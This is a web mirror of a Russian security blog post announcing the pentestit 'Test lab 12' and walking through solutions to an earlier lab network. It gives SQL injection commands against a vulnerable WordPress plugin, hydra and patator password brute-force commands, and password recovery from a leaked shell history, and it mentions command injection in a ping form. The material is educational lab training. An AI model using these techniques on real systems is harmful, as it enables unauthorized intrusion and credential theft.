<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>50 shades of token</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Tomorrow at 12:00 Moscow time, a new penetration testing lab ‚ÄúTest lab 12‚Äù will be launched, which is a copy of the real corporate network with its in...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>50 shades of token</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/fb/38/jx/fb38jx-mcoeneaf9dywo819gh2w.png"><br><br>  Tomorrow at 12:00 Moscow time, a new penetration testing lab ‚ÄúTest lab 12‚Äù will be launched, which is a copy of the real corporate network with its inherent vulnerabilities and configuration errors.  The laboratory‚Äôs website already has 25,000 registered participants, including leading information security experts from major Russian and international companies. <br><br>  Below is information on the composition of the new laboratory, examples of finding and operating vulnerabilities and material for training. <br><a name="habracut"></a><br><blockquote>  The main focus in the laboratories is on realism: the IT structure is designed by analogy with the corporate networks of companies, bringing the actions of the attackers to real hacking.  Participants acting as intruders try to exploit the vulnerabilities inherent, and, if successful, gain access to individual laboratory nodes, each of which contains a token.  The winner is the participant who first collected all the <b>tokens</b> , that is, in fact, he had full control over the virtual corporate network. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Everyone who wishes, regardless of qualification level, can test penetration testing skills in conditions as close to real as possible without violating the law. </blockquote><br>  The new laboratory will consist of a distributed computer network, represented in the form of several perimeters with different levels of intrusion complexity.  The first (outer) perimeter will be ‚Äúpushed through‚Äù the easiest; further, the advancement will become more complicated.  In the most difficult sector, we place vulnerabilities that are difficult to exploit with a large number of participants.  This approach allows us to solve two problems at once: <br><br><ul><li>  allow everyone to evaluate their skills in the laboratory, while maintaining its realistic; </li><li>  eliminate the situation in which performing the operation of certain types of vulnerabilities or conducting an attack, participants interfere with each other. </li></ul><br><img src="https://habrastorage.org/webt/4j/-e/lt/4j-elt3zy2rgfwyeoe6gdzfseie.png"><br><br>  <s>The film was shot</s> In the laboratory were used: <br><br><ul><li>  Various network services (Mail, DNS, AD and VPN, etc.), SIEM and DBMS; </li><li>  WebApp and API (PHP, Python, Django, Java); </li><li>  Self-written desktop applications; </li><li>  Additional support services to make it realistic. </li></ul><br>  To pass the laboratory will require: <br><br><ul><li>  skills in working with various network protocols; </li><li>  the ability to analyze data from the SIEM system, configure correlation filters, and so on; </li><li>  experience reverse engineering; </li><li>  experience finding vulnerabilities in network services and web applications. </li></ul><br><h4>  Private Lab Penetration Testing </h4><br><blockquote>  We decided to lay out the implementation of several tasks of the past private laboratory, which was developed this summer, to help novice specialists to quickly obtain basic competencies. <br><br>  All information regarding the composition of the laboratory (systems, users, etc.) is fictional and serves only to create its realistic image. <br><br>  The penetration testing techniques described in the article are educational in nature.  Do not violate the law. </blockquote><br>  The entire structure of the fictional UNIONSEC organization, consisting of 15 servers, was located behind the 192.168.102.10 gateway, accessible after the VPN connection was established.  The participants were given the task - to compromise the corporate network of the laboratory.  The result of the exploitation of each pledged vulnerability was a token that had to be passed through the form on the page <a href="https://lab.pentestit.ru/">lab.pentestit.ru</a> . <br><br><img src="https://habrastorage.org/webt/0r/7q/xi/0r7qxi79horuh7ej9nqz5smneke.png"><br><br>  The laboratory attacked 7 teams of two participants, but no one managed to compromise the entire network.  Nevertheless, some teams showed decent results. <br><br><img src="https://habrastorage.org/webt/sy/qy/v9/syqyv9zvqhiu3ejefv4hqi6iyka.png"><br><br>  Working in the laboratory required experience in working with various tools and penetration testing. In addition, some tasks could not be completed without knowledge in development and reverse engineering.  Considering the limited time that was given to the participants for the assignment, the performance of almost half of the assignments, in our opinion, is a worthy result. <br><br><hr><br><h4>  Intelligence service </h4><br>  Using the nmap utility, we get a list of open ports: <br><br> <code>nmap 192.168.102.10 -sV</code> <br> <br><img src="https://habrastorage.org/webt/mf/bw/d_/mfbwd_gapske6ktqjii1e2gc6tc.png"><br><br><hr><br><h4>  The site of the company </h4><br>  At <a href="http://192.168.102.10/">192.168.102.10</a> in the section "Contact us" we see the list of E-mail addresses: <br><img src="https://habrastorage.org/webt/14/j7/wf/14j7wfm3pfdh-u937ksiqzfxcc4.png"><br><br>  According to the HTML code of the application, we can assume that it uses Wordpress CMS and contains the plugin wp-symposium-15.1. <br><br>  Through <a href="http://www.exploit-db.com/">www.exploit-db.com we</a> determine that the plugin is vulnerable to SQL injection.  Through URI <code>192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=</code> "we are trying to exploit the vulnerability using the BASH script: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash for ((i=0; i&lt;= 10; i++)) do wget --no-proxy -q -O- "http://192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA limit 1 offset $i; --" echo "" done</span></span></code> </pre><br>  Get the list of databases: <br><br> <code>information_schema <br> wp_db</code> <br> <br>  and after exploiting the vulnerability, the token: <br><br> <code>wget -q -O- 192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=* from token; --"</code> <br> <br><img src="https://habrastorage.org/webt/qi/h4/pb/qih4pbyl5kf6j-y3s4pblrygujw.png"><br><br><hr><br><h4>  post office </h4><br>  We perform brute-force use of hydra tools: <br><br> <code>hydra smtp://192.168.101.10 -s 25 -L /tmp/emails -P /tmp/pass</code> <br> <br><img src="https://habrastorage.org/webt/1m/et/ti/1mettilfi94s4k7jjsbdmdv_nso.png"><br><br>  Using the obtained data, we authorize the mail server's WUI and get the token: <br><br><img src="https://habrastorage.org/webt/vz/w9/ja/vzw9jav772ho_5_zakgyzedpmly.png"><br><hr><br><h4>  Openvpn </h4><br>  <b>Connection</b> <br><br>  From the web-site <code>http://192.168.102.10:88</code> load the file ‚Äúopenvpn.conf‚Äù.  After performing a server scan (for example, with the DirBuster utility), we find <code>.bash_history</code> : <br><br> <code>-bash: generating new OpenVPN password for user admin: command not found <br> -bash: generating: command not found <br> -bash: date +%F: command not found <br> -bash: echo "admin:`date +%F | md5sum | sed -s 's/ -//'`" &gt; /etc/openvpn/user.pass: command not found <br> cat /etc/openvpn/user.pass <br> service openvpn restart <br> exit</code> <br> <br>  where you can find the user name, as well as the password generation algorithm.  To play a previously created password, use the exact date of file creation: <br><br><img src="https://habrastorage.org/webt/x9/cp/z7/x9cpz7dwrs41x2guq_6yn4syli4.png"><br><br>  and perform the conversion according to the command history.  The received password is used for VPN authentication. <br><br>  <b>Server scan</b> <br><br>  Having connected to the VPN, we will perform the server port scan: <br><br><img src="https://habrastorage.org/webt/ih/f3/os/ihf3osp2mpm3h7xhnwvs-dypv0q.png"><br><br>  We get the token at <code>http://10.255.0.1:8080</code> : <br><br><img src="https://habrastorage.org/webt/po/to/yk/potoykgfqytcp-qq9bjzndvs_ay.png"><br><br><hr><br><h4>  TERMINAL </h4><br>  The VPN server sends us several routing to the internal networks, after scanning which we discover several hosts with an open 22 port.  We try to log in under the account <code>dev</code> .  Having connected to one of the servers, we find the presence of the / home / support directory and try to select a password for the account of the same name: <br><br> <code>patator ssh_login host=192.168.11.5 user=support password=FILE0 0=usr/share/wordlists/rockyou.txt -x ignore:fgrep='Authentication failed'</code> <br> <br><img src="https://habrastorage.org/webt/vi/ow/p5/viowp5ozuathyig5war1rmiyfgk.png"><br><br>  Having picked up the password, we get the token located in the home directory: <br><br><img src="https://habrastorage.org/webt/2o/fh/fv/2ofhfvjycgf3uzl8-osbun_wnta.png"><br><br><h4>  Reverse engineering </h4><br>  On the TERMINAL server, we are able to find the executable file <code>admin.bin</code> , which is completed when the password is requested.  With the help of the reverse we get the password <code>fv34cm3cm</code> , which is a token.  When you enter it, we get <code>SSH PRIVATE KEY</code> . <br><br>  With the private key, we perform authentication on the server <code>192.168.11.2</code> , in which we find the file <code>dump.pcap</code> in the <code>/opt/</code> <code>dump.pcap</code> .  We analyze the network traffic dump from the file and extract the token as well as the password for the BASIC authorization on the web server <code>192.168.11.3</code> : <br><br> <code>tcpdump -r /tmp/dump.pcap -A | grep token</code> <br> <br><img src="https://habrastorage.org/webt/mr/an/zs/mranzsddm4yyomwniy2sg8twq_s.png"><br><br><hr><br><h4>  API </h4><br>  At <code>192.168.11.3</code> there is an API available from the administrator's PC.  Using the broadcast ports (for example, through SSH), we begin his study. <br><br>  Having exploited the vulnerability found in the API, we get a token that is part of the <code>admin</code> user password: <br><br><img src="https://habrastorage.org/webt/ef/qz/rk/efqzrkkfdflkxw0qqg37dqzfxcu.png"><br><br>  A web application is available at <code>http://172.16.0.4</code> , which is under development.  From the file <code>readme.html</code> we get a list of the pages being developed: <br><br><img src="https://habrastorage.org/webt/_i/hz/r6/_ihzr6hve03n1-00isl6yhsurny.png"><br><br>  When opening <code>http://172.16.0.4/availability.php</code> we get an error.  We try to repeat the action using the parameter <code>REFERRER http://172.16.0.4/index.html</code> , after which the form with the <code>ping</code> button becomes available: <br><br><img src="https://habrastorage.org/webt/pq/tv/mw/pqtvmwh04n3oaucrzn2re7owqho.png"><br><br>  Making sure that the input field does not have filtering, we get the token: <br><br><img src="https://habrastorage.org/webt/97/ct/0p/97ct0psdkhv5kg5nqucixmo9e8s.png"><br>  Connect via <code>SSH</code> to server <code>172.16.0.1</code> .  After authorization, we are met by a script that requests a PIN (5 digits): <br><br><img src="https://habrastorage.org/webt/a7/su/cx/a7sucxpliswwxkr3hoihr9eltqg.png"><br><br>  Using the samopisny password guessing script, we get full access to the console and find the file with the token in the user‚Äôs folder: <br><br><img src="https://habrastorage.org/webt/0n/lg/sf/0nlgsfv6nxs5rk4abobt0fobits.png"><br><hr><br><h4>  Back to the Future </h4><br>  To quickly get used to the new, 12th laboratory, we have prepared a small list of materials and tools: <br><br><ul><li>  <a href="https://habr.com/company/pentestit/blog/432014/">Kali Linux for beginners</a> </li><li>  <a href="https://defcon.ru/web-security/780/">Owasp Testing Guide Translation</a> </li><li>  <a href="https://habr.com/company/pentestit/blog/332902/">Passage of "Test lab 11"</a> from her winner <a href="https://habr.com/users/alexeystoletny/" class="user_link">alexeystoletny</a> </li><li>  Instrumentation: Nmap, SQLmap, Burp Suite, WPScan, Nikto / DirBuster / w3af, Dig, Patator / Hydra, IDA Pro </li></ul><br>  See you in <a href="https://lab.pentestit.ru/">‚ÄúTest lab 12‚Äù</a> and let the strongest win! </div><p>Source: <a href="https://habr.com/ru/post/432940/">https://habr.com/ru/post/432940/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../432928/index.html">What Intel is doing and why Amazon will not transfer AWS entirely to its chips despite loud headers</a></li>
<li><a href="../432930/index.html">Exploit Wednesday December 2018: for tests of new patches of time to spare - drove ...</a></li>
<li><a href="../432932/index.html">Ecosystem of the digital procurement world (to steal less)</a></li>
<li><a href="../432934/index.html">Easily accessible levitation in ultrasound</a></li>
<li><a href="../432936/index.html">Webinar Group-IB "Intelligence-driven SOC and is it possible to do without it?"</a></li>
<li><a href="../432942/index.html">Patterns and antipatterns Corutin in Kotlin</a></li>
<li><a href="../432944/index.html">Forced PostgreSQL Query Optimization</a></li>
<li><a href="../432946/index.html">Unity - 2D game development pitfalls</a></li>
<li><a href="../432948/index.html">Smart clouds, smart enterprises: how AI transforms the cloud computing industry</a></li>
<li><a href="../432954/index.html">And back into space: how the unicorn Stellarium visited</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>